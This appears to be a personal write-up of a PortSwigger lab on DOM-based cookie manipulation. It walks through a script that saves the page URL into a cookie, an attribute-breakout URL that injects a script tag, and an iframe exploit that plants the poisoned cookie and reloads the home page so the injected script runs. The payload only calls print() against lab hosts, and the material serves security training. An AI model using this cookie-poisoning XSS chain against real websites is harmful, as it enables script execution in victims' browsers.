# [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

> on visiting a product a script run to remember the last product `url` and saved as a `cookie`

```
<script>
  document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

> going back on the home page there will be a link with the saved `url`

```
<a href='https://xxx.web-security-academy.net/product?productId=1'>Last viewed product</a><p>|</p>
```

> from the `url` there ia way to break out

```
https://xxx.web-security-academy.net/product?productId=1&'><script>print()</script>
```

> creating the exploit

```
<iframe
  src="https://xxx.web-security-academy.net/product?productId=1&'><script>print()</script>"
  onload="
    if (!window.x) this.src = 'https://xxx.web-security-academy.net/';
    window.x = 1;
  "
></iframe>
```

- the `<iframe>` `src` will have the "broken" `url`, this will create the "broken" `cookie`
- the `onload` first checks if there is a `window.x`
- there is no `window.x` yet
- the `!` negates the check, so it lets the `if` "continue"
- it reloads the `<iframe>` with the homepage
- then sets the `window.x` to a value, so it does not reloads again
